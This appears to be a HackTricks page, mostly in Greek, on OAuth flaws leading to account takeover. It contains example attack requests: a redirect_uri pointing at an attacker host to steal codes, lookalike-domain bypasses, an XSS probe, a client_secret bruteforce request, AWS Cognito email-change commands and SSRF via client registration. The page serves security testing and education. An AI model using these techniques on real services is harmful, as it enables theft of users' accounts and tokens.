# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες <a href="#d4a8" id="d4a8"></a>

Το OAuth προσφέρει διάφορες εκδόσεις, με βασικές πληροφορίες διαθέσιμες στο [OAuth 2.0 documentation](https://oauth.net/2/). Αυτή η συζήτηση επικεντρώνεται κυρίως στον ευρέως χρησιμοποιούμενο [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), παρέχοντας ένα πλαίσιο εξουσιοδότησης που επιτρέπει σε μια εφαρμογή να έχει πρόσβαση ή να εκτελεί ενέργειες στον λογαριασμό ενός χρήστη σε μια άλλη εφαρμογή (τον authorization server).

Σκεφτείτε έναν υποθετικό ιστότοπο _**https://example.com**_, σχεδιασμένο για να **εμφανίζει όλες τις αναρτήσεις σας στα social media**, συμπεριλαμβανομένων των ιδιωτικών. Για αυτό χρησιμοποιείται το OAuth 2.0. Το _https://example.com_ θα ζητήσει την άδειά σας να **προσπελάσει τις αναρτήσεις σας στα social media**. Ως αποτέλεσμα, μια οθόνη συναίνεσης θα εμφανιστεί στο _https://socialmedia.com_, περιγράφοντας τις **άδειες που ζητούνται και τον developer που κάνει το αίτημα**. Μετά την εξουσιοδότησή σας, το _https://example.com_ αποκτά τη δυνατότητα να **προσπελάσει τις αναρτήσεις σας εκ μέρους σας**.

Είναι σημαντικό να κατανοήσετε τα ακόλουθα στοιχεία στο πλαίσιο του OAuth 2.0:

- **resource owner**: Εσείς, ως **χρήστης/οντότητα**, εξουσιοδοτείτε την πρόσβαση στο resource σας, όπως τις αναρτήσεις του λογαριασμού σας στα social media.
- **resource server**: Ο **server που διαχειρίζεται τα πιστοποιημένα αιτήματα** αφού η εφαρμογή έχει αποκτήσει ένα `access token` εκ μέρους του `resource owner`, π.χ., **https://socialmedia.com**.
- **client application**: Η **εφαρμογή που ζητά εξουσιοδότηση** από τον `resource owner`, όπως **https://example.com**.
- **authorization server**: Ο **server που εκδίδει `access tokens`** στην `client application` μετά την επιτυχή πιστοποίηση του `resource owner` και τη λήψη εξουσιοδότησης, π.χ., **https://socialmedia.com**.
- **client_id**: Ένας δημόσιος, μοναδικός αναγνωριστικός για την εφαρμογή.
- **client_secret:** Ένα εμπιστευτικό κλειδί, γνωστό μόνο στην εφαρμογή και στον authorization server, που χρησιμοποιείται για τη δημιουργία `access_tokens`.
- **response_type**: Μια τιμή που καθορίζει **τον τύπο του token που ζητείται**, όπως `code`.
- **scope**: Το **επίπεδο πρόσβασης** που ζητά η `client application` από τον `resource owner`.
- **redirect_uri**: Το **URL στο οποίο ανακατευθύνεται ο χρήστης μετά την εξουσιοδότηση**. Συνήθως πρέπει να συμφωνεί με το προεγγεγραμμένο redirect URL.
- **state**: Παράμετρος για **τη διατήρηση δεδομένων κατά την ανακατεύθυνση του χρήστη προς και από τον authorization server**. Η μοναδικότητά της είναι κρίσιμη καθώς λειτουργεί ως **μηχανισμός προστασίας CSRF**.
- **grant_type**: Παράμετρος που υποδεικνύει **τον τύπο του grant και τον τύπο του token που θα επιστραφεί**.
- **code**: Ο authorization code από τον `authorization server`, που χρησιμοποιείται σε συνδυασμό με `client_id` και `client_secret` από την client application για να αποκτήσει ένα `access_token`.
- **access_token**: Το **token που χρησιμοποιεί η client application για API αιτήματα** εκ μέρους του `resource owner`.
- **refresh_token**: Επιτρέπει στην εφαρμογή να **αποκτήσει νέο `access_token` χωρίς να ξαναζητήσει την άδεια του χρήστη**.

### Ροή

Η **πραγματική ροή OAuth** προχωρά ως εξής:

1. Επισκέπτεστε το [https://example.com](https://example.com) και επιλέγετε το κουμπί “Integrate with Social Media”.
2. Ο ιστότοπος στέλνει ένα αίτημα στο [https://socialmedia.com](https://socialmedia.com) ζητώντας την άδειά σας ώστε η εφαρμογή του https://example.com να έχει πρόσβαση στις αναρτήσεις σας. Το αίτημα είναι δομημένο ως:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Στη συνέχεια σας εμφανίζεται μια σελίδα συγκατάθεσης.
4. Μετά την έγκρισή σας, Social Media στέλνει μια απάντηση στο `redirect_uri` με τις παραμέτρους `code` και `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com χρησιμοποιεί αυτό το `code`, μαζί με το `client_id` και το `client_secret`, για να κάνει ένα server-side request για να αποκτήσει ένα `access_token` εκ μέρους σας, επιτρέποντας πρόσβαση στις άδειες στις οποίες δώσατε συγκατάθεση:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Τέλος, η διαδικασία ολοκληρώνεται καθώς https://example.com χρησιμοποιεί το `access_token` σου για να κάνει ένα API call στο Social Media για να αποκτήσει

## Ευπάθειες <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), ο authorization server πρέπει να ανακατευθύνει τον browser μόνο σε **pre-registered, exact redirect URIs**. Οποιαδήποτε αδυναμία εδώ επιτρέπει σε έναν attacker να στείλει ένα victim μέσω ενός malicious authorization URL έτσι ώστε το IdP να παραδίδει το victim’s `code` (και `state`) ευθέως σε έναν attacker endpoint, ο οποίος μπορεί στη συνέχεια να το εξαργυρώσει και να συλλέξει tokens.

Τυπική ροή επίθεσης:

1. Κατασκεύασε `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` και στείλ’ το στο victim.
2. Ο victim αυθεντικοποιείται και εγκρίνει τα scopes.
3. Το IdP ανακατευθύνει σε `attacker.tld/callback?code=<victim-code>&state=...` όπου ο attacker καταγράφει το request και αμέσως εξαργυρώνει το code.

Κοινά σφάλματα validation που πρέπει να ελεγχθούν:

- **No validation** – οποιοδήποτε absolute URL γίνεται αποδεκτό, με αποτέλεσμα άμεση κλοπή του `code`.
- **Weak substring/regex checks on the host** – παράκαμψη με lookalikes όπως `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ή `match.com@evil.com`.
- **IDN homograph mismatches** – η validation γίνεται στη μορφή punycode (`xn--`), αλλά ο browser ανακατευθύνει στο Unicode domain που ελέγχεται από τον attacker.
- **Arbitrary paths on an allowed host** – τοποθέτηση του `redirect_uri` σε `/openredirect?next=https://attacker.tld` ή οποιοδήποτε XSS/user-content endpoint διαρρέει το `code` είτε μέσω chained redirects, Referer headers, ή injected JavaScript.
- **Directory constraints without normalization** – προτύπα σαν `/oauth/*` μπορούν να παρακαμφθούν με `/oauth/../anything`.
- **Wildcard subdomains** – η αποδοχή του `*.example.com` σημαίνει ότι κάθε takeover (dangling DNS, S3 bucket, κ.λπ.) δίνει άμεσα ένα έγκυρο callback.
- **Non-HTTPS callbacks** – η επιτρέπει `http://` URIs δίνει σε network attackers (Wi-Fi, corporate proxy) την ευκαιρία να αρπάξουν το `code` εν κινήσει.

Επίσης έλεγξε βοηθητικές παραμέτρους τύπου redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, κ.ά.) και το OpenID discovery document (`/.well-known/openid-configuration`) για επιπλέον endpoints που μπορεί να κληρονομήσουν τα ίδια validation bugs.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Όπως αναφέρεται σε αυτό το bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), ενδέχεται το redirect **URL να αντανακλάται στην απάντηση** του server μετά την αυθεντικοποίηση του χρήστη, καθιστώντας το **ευάλωτο σε XSS**. Πιθανό payload για δοκιμή:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Εσφαλμένη διαχείριση της παραμέτρου `state` <a href="#bda5" id="bda5"></a>

Η `state` παράμετρος είναι το Authorization Code flow CSRF token: ο client πρέπει να δημιουργεί μια **κρυπτογραφικά τυχαία τιμή ανά instance του browser**, να την αποθηκεύει κάπου που μόνο εκείνος ο browser μπορεί να διαβάσει (cookie, local storage, κ.λπ.), να τη στέλνει στο authorization request και να απορρίπτει κάθε response που δεν επιστρέφει την ίδια τιμή. Όταν η τιμή είναι στατική, προβλέψιμη, προαιρετική ή δεν συνδέεται με το session του χρήστη, ο attacker μπορεί να ολοκληρώσει το δικό του OAuth flow, να αποσπάσει το τελικό `?code=` request (χωρίς να το αποστείλει), και αργότερα να εξαναγκάσει τον browser του θύματος να το επαναφέρει (replay) ώστε ο λογαριασμός του θύματος να συνδεθεί με το profile του attacker στο identity provider.

Το μοτίβο replay είναι πάντα το ίδιο:

1. Ο attacker αυθεντικοποιείται στο IdP με τον δικό του λογαριασμό και υποκλέπτει το τελευταίο redirect που περιέχει το `code` (και οποιοδήποτε `state`).
2. Αποθηκεύει αυτό το request, κρατάει το URL, και αργότερα καταχράται οποιοδήποτε CSRF primitive (link, iframe, auto-submitting form) για να αναγκάσει τον browser του θύματος να το φορτώσει.
3. Αν ο client δεν επιβάλει `state`, η εφαρμογή καταναλώνει το authorization αποτέλεσμα του attacker και κάνει login τον attacker στον λογαριασμό του θύματος στην εφαρμογή.

Μια πρακτική checklist για τη διαχείριση του `state` κατά τη διάρκεια των tests:

- **Missing `state` entirely** – αν η παράμετρος δεν εμφανίζεται ποτέ, ολόκληρο το login είναι CSRFable.
- **`state` not required** – αφαιρέστε το από το αρχικό request; αν το IdP εξακολουθεί να εκδίδει codes που ο client αποδέχεται, η άμυνα είναι opt-in.
- **Returned `state` not validated** – τροποποιήστε την τιμή στο response (Burp, MITM proxy). Η αποδοχή μη-ταιριασμένων τιμών σημαίνει ότι το αποθηκευμένο token δεν συγκρίνεται ποτέ.
- **Predictable or purely data-driven `state`** – πολλές εφαρμογές βάζουν redirect paths ή JSON blobs μέσα στο `state` χωρίς να προσθέτουν τυχαιότητα, επιτρέποντας σε attackers να μαντέψουν έγκυρες τιμές και να επαναλάβουν flows. Πάντα προ-προσθέστε/συναρτήστε ισχυρή τυχαιότητα πριν την κωδικοποίηση των δεδομένων.
- **`state` fixation** – αν η εφαρμογή επιτρέπει σε χρήστες να παρέχουν την τιμή `state` (π.χ. μέσω crafted authorization URLs) και την επαναχρησιμοποιεί σε όλο το flow, ένας attacker μπορεί να κλειδώσει μια γνωστή τιμή και να τη χρησιμοποιήσει σε πολλούς victims.

PKCE μπορεί να συμπληρώσει το `state` (ειδικά για public clients) δεσμεύοντας το authorization code σε ένα code verifier, αλλά οι web clients εξακολουθούν να πρέπει να παρακολουθούν το `state` για να προλάβουν cross-user CSRF/account-linking σφαλμάτων.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Οι attackers μπορούν να δημιουργήσουν προληπτικά έναν λογαριασμό χρησιμοποιώντας το email του θύματος. Αν το θύμα αργότερα χρησιμοποιήσει έναν third-party service για login, η εφαρμογή μπορεί ακούσια να συνδέσει αυτόν τον third-party λογαριασμό με τον προϋπάρχοντα λογαριασμό που δημιούργησε ο attacker, οδηγώντας σε μη εξουσιοδοτημένη πρόσβαση.
2. **Exploiting Lax OAuth Email Verification**: Οι attackers μπορεί να εκμεταλλευτούν OAuth υπηρεσίες που δεν επαληθεύουν emails, εγγραφόμενοι στην υπηρεσία και στη συνέχεια αλλάζοντας το email του λογαριασμού σε αυτό του θύματος. Αυτή η μέθοδος έχει παρόμοιο ρίσκο μη εξουσιοδοτημένης πρόσβασης, παρόμοια με το πρώτο σενάριο αλλά μέσω διαφορετικού attack vector.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

Το `client_id` είναι σκόπιμα δημόσιο, αλλά το **`client_secret` δεν πρέπει ποτέ να είναι ανακτήσιμο από end users**. Authorization Code deployments που ενσωματώνουν το secret σε **mobile APKs, desktop clients, ή single-page apps** ουσιαστικά παραδίδουν αυτό το credential σε όποιον μπορεί να κατεβάσει το package. Πάντα ελέγχετε public clients με:

- Unpacking το APK/IPA, τον desktop installer ή το Electron app και grep για `client_secret`, Base64 blobs που αποκωδικοποιούνται σε JSON, ή hard-coded OAuth endpoints.
- Ανασκόπηση bund-led config files (plist, JSON, XML) ή decompiled strings για client credentials.

Μόλις ο attacker εξάγει το secret, χρειάζεται μόνο να κλέψει οποιοδήποτε victim authorization `code` (μέσω ενός αδύναμου `redirect_uri`, logs, κ.λπ.) για να καλέσει ανεξάρτητα το `/token` και να εκδώσει access/refresh tokens χωρίς να εμπλέξει την νόμιμη εφαρμογή. Θεωρήστε public/native clients ως **ακατάλληλους για την αποθήκευση secrets**—αντ’ αυτού πρέπει να βασίζονται σε PKCE (RFC 7636) για να αποδείξουν την κατοχή ενός per-instance code verifier αντί για ένα στατικό secret. Κατά το testing, επιβεβαιώστε αν το PKCE είναι υποχρεωτικό και αν το backend απορρίπτει πραγματικά token exchanges που παραλείπουν είτε το `client_secret` **ή** έναν έγκυρο `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Μόλις ο client έχει τα **code and state**, αν αυτά **αντανακλώνται μέσα στο Referer header** όταν ο χρήστης περιηγείται σε διαφορετική σελίδα, τότε είναι ευάλωτο.

### Access Token Stored in Browser History

Η βασική εγγύηση του Authorization Code grant είναι ότι **access tokens ποτέ δεν φτάνουν στο browser του resource owner**. Όταν υλοποιήσεις διαρρέουν tokens client-side, οποιοδήποτε μικρό σφάλμα (XSS, Referer leak, proxy logging) γίνεται άμεση παραβίαση λογαριασμού. Πάντα έλεγχε για:

- **Tokens in URLs** – αν το `access_token` εμφανίζεται στο query/fragment, καταγράφεται στο browser history, στα server logs, στα analytics και στα Referer headers που αποστέλλονται σε τρίτους.
- **Tokens transiting untrusted middleboxes** – επιστροφή tokens μέσω HTTP ή μέσω debugging/corporate proxies επιτρέπει σε παρατηρητές του δικτύου να τα καταγράφουν άμεσα.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, ή σειριοποιημένα JSON blobs εκθέτουν tokens σε κάθε script στο origin (συμπεριλαμβανομένων XSS payloads ή κακόβουλων extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` διατηρούν tokens καιρό μετά το logout σε κοινόχρηστες συσκευές και είναι προσβάσιμα από scripts.

Οποιοδήποτε από αυτά τα ευρήματα συνήθως αναβαθμίζει αλλιώς “χαμηλού” σοβαρότητας σφάλματα (όπως ένα CSP bypass ή DOM XSS) σε πλήρη API takeover, επειδή ο attacker μπορεί απλά να διαβάσει και να επαναπαίξει το leaked bearer token.

### Everlasting Authorization Code

Οι authorization codes πρέπει να είναι **βραχυχρόνιοι, single-use, και replay-aware**. Κατά την αξιολόγηση μιας ροής, αιχμαλώτισε ένα `code` και:

- **Test the lifetime** – RFC 6749 προτείνει λεπτά, όχι ώρες. Δοκίμασε να εξαργυρώσεις το code μετά από 5–10 λεπτά· αν εξακολουθεί να λειτουργεί, το παράθυρο έκθεσης για οποιοδήποτε leaked code είναι υπερβολικό.
- **Test sequential reuse** – στείλε το ίδιο `code` δύο φορές. Αν το δεύτερο request επιστρέψει άλλο token, οι attackers μπορούν να κλωνοποιούν sessions επ’ αόριστον.
- **Test concurrent redemption/race conditions** – εκτέλεσε δύο token requests παράλληλα (Burp intruder, turbo intruder). Αδύναμοι issuers μερικές φορές εκδίδουν και τα δύο.
- **Observe replay handling** – μια προσπάθεια reuse δεν πρέπει μόνο να αποτύχει αλλά και να ανακαλέσει τυχόν tokens που ήδη εκδόθηκαν από εκείνο το code. Διαφορετικά, μια εντοπισμένη replay αφήνει το πρώτο token του attacker ενεργό.

Ο συνδυασμός ενός replay-friendly code με οποιοδήποτε `redirect_uri` ή logging bug επιτρέπει επίμονη πρόσβαση σε λογαριασμό ακόμη και μετά ο θύμα ολοκληρώσει το νόμιμο login.

### Authorization/Refresh Token not bound to client

Αν μπορείς να πάρεις τον **authorization code και να τον χρησιμοποιήσεις με διαφορετικό client**, τότε μπορείς να takeover άλλους λογαριασμούς.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

Σε αυτό το bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) μπορείς να δεις ότι το **token** που επιστρέφει ο **AWS Cognito** στον χρήστη μπορεί να έχει **αρκετά permissions για να αντικαταστήσει τα user data**. Επομένως, αν μπορείς να **αλλάξεις το user email σε διαφορετικό user email**, μπορεί να καταφέρεις να **take over** λογαριασμούς άλλων.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Κατάχρηση tokens άλλων εφαρμογών <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows που αναμένουν να λάβουν το **token** (και όχι ένα code) μπορεί να είναι ευάλωτα αν δεν ελέγχουν ότι το token ανήκει στην εφαρμογή.

Αυτό συμβαίνει γιατί ένας **attacker** μπορεί να δημιουργήσει μια **application supporting OAuth and login with Facebook** (για παράδειγμα) στην δική του εφαρμογή. Έπειτα, όταν ένα θύμα κάνει login με Facebook στην **attackers application**, ο attacker μπορεί να πάρει το **OAuth token του χρήστη που δόθηκε στην εφαρμογή του**, και να το χρησιμοποιήσει για να κάνει login στην OAuth εφαρμογή του θύματος χρησιμοποιώντας το token του χρήστη-θύματος.

> [!CAUTION]
> Συνεπώς, αν ο attacker καταφέρει να κάνει τον χρήστη να πρόσβαση στην δική του OAuth εφαρμογή, θα μπορέσει να takeover το account του θύματος σε εφαρμογές που περιμένουν ένα token και δεν ελέγχουν αν το token χορηγήθηκε για το δικό τους app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ήταν δυνατό να κάνεις ένα θύμα να ανοίξει μια σελίδα με ένα **returnUrl** που δείχνει στο attackers host. Αυτή η πληροφορία θα αποθηκευόταν σε ένα cookie (RU) και σε ένα **μετέπειτα βήμα** το **prompt** θα **ρωτούσε** τον **χρήστη** αν θέλει να δώσει πρόσβαση σε αυτόν τον attackers host.

Για να παρακαμφθεί αυτό το prompt, ήταν δυνατό να ανοίξεις ένα tab για να ξεκινήσει το **Oauth flow** που θα ρύθμιζε αυτό το RU cookie χρησιμοποιώντας το **returnUrl**, να κλείσεις το tab πριν εμφανιστεί το prompt, και να ανοίξεις ένα νέο tab χωρίς αυτή την τιμή. Τότε, το **prompt** δεν θα ενημέρωνε για τον attackers host, αλλά το cookie θα ήταν ρυθμισμένο σε αυτόν, οπότε το **token θα σταλεί στον attackers host** κατά την ανακατεύθυνση.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), μερικές υλοποιήσεις OAuth επιτρέπουν να δηλώσεις το GET παράμετρο **`prompt`** ως None (**`&prompt=none`**) για να **αποφευχθεί το να ζητηθεί από τους χρήστες να επιβεβαιώσουν** την παρεχόμενη πρόσβαση σε ένα prompt στο web αν είναι ήδη logged in στην πλατφόρμα.

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), ίσως είναι δυνατό να ορίσεις την παράμετρο **`response_mode`** για να υποδείξεις πού θέλεις να παραδοθεί ο code στο τελικό URL:

- `response_mode=query` -> Ο code παρέχεται μέσα σε μία GET παράμετρο: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Ο code παρέχεται μέσα στο fragment του URL `#code=2397rf3gu93f`
- `response_mode=form_post` -> Ο code παρέχεται μέσα σε ένα POST form με ένα input που ονομάζεται `code` και την τιμή
- `response_mode=web_message` -> Ο code αποστέλλεται σε ένα post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

Τα OAuth consent/login dialogs είναι ιδανικοί στόχοι για clickjacking: αν μπορούν να μπουν σε frame, ένας attacker μπορεί να επικάλυψη custom γραφικά, να κρύψει τα πραγματικά κουμπιά και να ξεγελάσει χρήστες ώστε να εγκρίνουν επικίνδυνες scopes ή να συνδέσουν accounts. Δημιούργησε PoC που:

1. Φορτώνει το IdP authorization URL μέσα σε ένα `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Χρησιμοποιεί absolute positioning/opacity tricks για να ευθυγραμμίσει fake κουμπιά με τα κρυμμένα **Allow**/**Approve** controls.
3. Προαιρετικά προ-συμπληρώνει παραμέτρους (scopes, redirect URI) ώστε η κλεμμένη έγκριση να ωφελεί άμεσα τον attacker.

Κατά τη δοκιμή επαλήθευσε ότι οι σελίδες του IdP εκπέμπουν είτε `X-Frame-Options: DENY/SAMEORIGIN` είτε ένα περιοριστικό `Content-Security-Policy: frame-ancestors 'none'`. Αν κανένα από τα δύο δεν είναι παρόν, επίδειξε τον κίνδυνο με εργαλεία όπως το [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) και καταγράψτε πόσο εύκολα ένα θύμα εξουσιοδοτεί την app του attacker. Για επιπλέον ιδέες payload δες το [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), αυτό είναι ένα OAuth flow που επιτρέπει να κάνεις login στο OAuth μέσω **username** και **password**. Αν σε αυτό το απλό flow επιστρέφεται ένα **token** με πρόσβαση σε όλες τις ενέργειες που μπορεί να κάνει ο χρήστης, τότε είναι δυνατό να παρακαμφθεί το 2FA χρησιμοποιώντας αυτό το token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) περιγράφει πώς ήταν δυνατό να καταχραστεί ένα **open redirect** χρησιμοποιώντας την τιμή από το **referrer** για να καταχραστεί το OAuth σε ATO. Η επίθεση ήταν:

1. Το θύμα προσπελάζει την attackers web page
2. Το θύμα ανοίγει το malicious link και ένα opener ξεκινάει το Google OAuth flow με `response_type=id_token,code&prompt=none` ως πρόσθετες παραμέτρους χρησιμοποιώντας ως **referrer the attackers website**.
3. Στο opener, αφού ο provider εξουσιοδοτήσει το θύμα, το στέλνει πίσω στην τιμή του `redirect_uri` parameter (victim web) με 30X code που κρατάει ακόμα το attackers website στο referer.
4. Η **victim website** ενεργοποιεί το open redirect based on the referrer ανακατευθύνοντας τον χρήστη στο attackers website, καθώς το **`respose_type`** ήταν **`id_token,code`**, ο code θα σταλεί στον attacker στο **fragment** του URL επιτρέποντάς του να takeover το account του χρήστη μέσω Google στην site του θύματος.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth λειτουργεί ως ένα λιγότερο προφανές αλλά κρίσιμο vector για ευπάθειες ασφαλείας, ειδικά για **Server-Side Request Forgery (SSRF)** επιθέσεις. Αυτό το endpoint επιτρέπει στους OAuth servers να λαμβάνουν λεπτομέρειες για client applications, συμπεριλαμβανομένων ευαίσθητων URLs που μπορούν να εκμεταλλευθούν.

Κύρια σημεία:

- **Dynamic Client Registration** συχνά χαρτογραφείται στο `/register` και δέχεται λεπτομέρειες όπως `client_name`, `client_secret`, `redirect_uris`, και URLs για logos ή JSON Web Key Sets (JWKs) μέσω POST requests.
- Αυτό το feature ακολουθεί specifications όπως το **RFC7591** και **OpenID Connect Registration 1.0**, που περιλαμβάνουν παραμέτρους πιθανόν ευάλωτες σε SSRF.
- Η διαδικασία registration μπορεί ακούσια να εκθέσει servers σε SSRF με διάφορους τρόπους:
  - **`logo_uri`**: Ένα URL για το logo της client εφαρμογής που ίσως κάνει fetch ο server, προκαλώντας SSRF ή οδηγώντας σε XSS αν το URL χειριστεί λανθασμένα.
  - **`jwks_uri`**: Ένα URL για το JWK document του client, το οποίο αν είναι κακόβουλα κατασκευασμένο μπορεί να κάνει τον server να πραγματοποιήσει εξωτερικά αιτήματα σε server ελεγχόμενο από attacker.
  - **`sector_identifier_uri`**: Αναφέρεται σε ένα JSON array από `redirect_uris`, το οποίο ο server μπορεί να κάνει fetch, δημιουργώντας ευκαιρία για SSRF.
  - **`request_uris`**: Λίστες επιτρεπόμενων request URIs για τον client, που μπορούν να εκμεταλλευτούν αν ο server κάνει fetch αυτές τις URIs στην αρχή της authorization διαδικασίας.

Εκμετάλλευση:

- SSRF μπορεί να ενεργοποιηθεί καταχωρώντας έναν νέο client με κακόβουλα URLs σε παραμέτρους όπως `logo_uri`, `jwks_uri`, ή `sector_identifier_uri`.
- Ενώ η άμεση εκμετάλλευση μέσω `request_uris` μπορεί να μετριαστεί με whitelist controls, η παροχή ενός pre-registered, attacker-controlled `request_uri` μπορεί να διευκολύνει SSRF κατά τη φάση της authorization.

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

Στο OAuth, το πεδίο sub ταυτοποιεί μοναδικά έναν χρήστη, αλλά η μορφή του διαφέρει ανά Authorization Server. Για να τυποποιήσουν την ταυτοποίηση, μερικοί clients χρησιμοποιούν emails ή user handles. Αυτό όμως είναι ριψοκίνδυνο γιατί:

- Κάποιοι Authorization Servers δεν διασφαλίζουν ότι αυτές οι ιδιότητες (π.χ. email) παραμένουν immutable.
- Σε ορισμένες υλοποιήσεις —όπως το **"Login with Microsoft"**— ο client βασίζεται στο πεδίο email, το οποίο είναι **user-controlled by the user in Entra ID** και δεν είναι επαληθευμένο.
- Ένας attacker μπορεί να το εκμεταλλευτεί δημιουργώντας το δικό του Azure AD organization (π.χ. doyensectestorg) και χρησιμοποιώντας το για να κάνει Microsoft login.
- Αν και το Object ID (αποθηκευμένο στο sub) είναι immutable και ασφαλές, η εξάρτηση από ένα mutable email field μπορεί να επιτρέψει account takeover (π.χ. hijacking ενός account όπως victim@gmail.com).

## Client Confusion Attack

Σε μια **Client Confusion Attack**, μια εφαρμογή που χρησιμοποιεί το OAuth Implicit Flow δεν επαληθεύει ότι το τελικό access token έχει παραχθεί ειδικά για το δικό της Client ID. Ένας attacker στήνει ένα public website που χρησιμοποιεί το Google’s OAuth Implicit Flow, εξαπατώντας χιλιάδες χρήστες να κάνουν login και συλλέγοντας access tokens προοριζόμενα για το attacker’s site. Αν αυτοί οι χρήστες έχουν επίσης accounts σε άλλη ευάλωτη ιστοσελίδα που δεν επαληθεύει το Client ID του token, ο attacker μπορεί να επαναχρησιμοποιήσει τα συλλεχθέντα tokens για να impersonate τα θύματα και να takeover τα accounts τους.

## Scope Upgrade Attack

Το **Authorization Code Grant** περιλαμβάνει secure server-to-server επικοινωνία για τη μετάδοση δεδομένων χρήστη. Ωστόσο, αν ο **Authorization Server** implicitely εμπιστεύεται μια παράμετρο scope στο Access Token Request (μια παράμετρο που δεν ορίζεται στο RFC), μια κακόβουλη εφαρμογή θα μπορούσε να αναβαθμίσει τα privileges ενός authorization code ζητώντας υψηλότερο scope. Αφού παραχθεί το **Access Token**, ο **Resource Server** πρέπει να το επαληθεύσει: για JWT tokens αυτό σημαίνει έλεγχο της JWT signature και εξαγωγή δεδομένων όπως client_id και scope, ενώ για random string tokens ο server πρέπει να κάνει query στον Authorization Server για να λάβει τις λεπτομέρειες του token.

## Redirect Scheme Hijacking

Σε mobile OAuth υλοποιήσεις, οι εφαρμογές χρησιμοποιούν **custom URI schemes** για να λαμβάνουν redirects με Authorization Codes. Όμως, επειδή πολλαπλές εφαρμογές μπορούν να εγγράψουν το ίδιο scheme σε μια συσκευή, η υπόθεση ότι μόνο ο νόμιμος client ελέγχει το redirect URI παραβιάζεται. Σε Android, για παράδειγμα, ένα Intent URI όπως `com.example.app://` caught based on the scheme και optional φίλτρα ορισμένα στο intent-filter μιας εφαρμογής. Επειδή το Android intent resolution μπορεί να είναι ευρύ —ειδικά αν μόνο το scheme έχει οριστεί— ένας attacker μπορεί να εγγράψει μια malicious app με ένα καλά σχεδιασμένο intent filter για να hijack το authorization code. Αυτό μπορεί να **επιτρέψει account takeover** είτε μέσω user interaction (όταν πολλαπλές apps είναι επιλέξιμες για να χειριστούν το intent) είτε μέσω bypass τεχνικών που εκμεταλλεύονται υπερβολικά ειδικά φίλτρα, όπως περιγράφεται στο Ostorlab's assessment flowchart.

## References

